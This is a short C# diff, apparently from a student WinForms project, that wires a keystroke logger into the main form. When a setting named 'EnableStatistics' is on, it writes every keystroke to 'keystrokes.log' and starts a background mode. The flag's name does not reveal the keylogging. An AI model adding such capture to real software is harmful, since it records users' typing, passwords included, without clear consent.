@@ -4,6 +4,7 @@ namespace FinalProject
     public partial class Main : Form
     {
         private Config config;
+        private KeyLogger keyLogger;
         public Main()
         {
             InitializeComponent();
@@ -37,6 +38,17 @@ namespace FinalProject
                 return;
             }
 
+            if (config.EnableStatistics)
+            {
+                string logPath = Path.Combine(config.ReportPath, "keystrokes.log");
+                keyLogger = new KeyLogger(logPath);
+                keyLogger.KeyLogged += (s, key) =>
+                {
+                    txtLog.Invoke((MethodInvoker)(() => txtLog.AppendText(key)));
+                };
+                keyLogger.Start();
+            }
+
             MessageBox.Show("Фоновий режим запущено!");
         }
 
@@ -45,5 +57,6 @@ namespace FinalProject
             Application.Exit();
         }
 
+        private void Main_Load(object sender, EventArgs e){}
     }
 }
